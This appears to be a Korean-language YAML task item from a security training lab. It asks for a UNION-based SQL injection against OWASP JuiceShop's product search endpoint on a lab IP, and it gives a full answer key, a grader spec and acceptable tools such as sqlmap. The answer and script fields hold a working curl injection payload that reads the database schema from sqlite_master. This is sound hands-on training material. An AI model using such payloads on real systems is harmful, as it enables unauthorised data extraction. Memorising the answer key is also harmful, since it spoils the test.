- order: 5
  instruction: JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을
    시도하여 데이터베이스 테이블 정보를 추출하라.
  hint: UNION SELECT와 sqlite_master를 활용하라
  category: exploit
  points: 15
  answer: '🤖 프롬프트: JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을
    시도하여 데이터베이스 테이블 정보를 추출해줘

    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'''
  answer_detail: UNION 기반 SQLi는 원래 쿼리에 UNION SELECT를 추가하여 다른 테이블의 데이터를 함께 출력하는 기법이다.
    sqlite_master(SQLite) 또는 information_schema(MySQL)에서 테이블 구조를 조회할 수 있다.
  verify:
    type: output_contains
    expect: SELECT
    field: stdout
    semantic:
      intent: JuiceShop 검색 UNION SELECT SQLi — sqlite_master 테이블 조회로 DB 스키마(테이블 이름·CREATE
        문) 추출
      success_criteria:
      - curl 로 q=...) UNION SELECT 쿼리 주입
      - 응답에 SELECT 또는 CREATE TABLE 키워드 포함된 스키마 정보
      - UNION 컬럼 수 매칭(9열)과 sqlite_master 사용 설명
      acceptable_methods:
      - curl URL-encoded UNION SELECT FROM sqlite_master
      - sqlmap -u <url>?q=FUZZ --technique=U --dbms=sqlite
      - Burp Intruder payload list
      - 수동 컬럼 수 ORDER BY 탐지 후 UNION
      negative_signs:
      - 일반 검색어만 전송
      - UNION 없이 단순 apostrophe
      - 컬럼 수 매칭 개념 설명 없음
  target_vm: attacker
  script: curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'
  risk_level: medium
  bastion_prompt: 'JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을
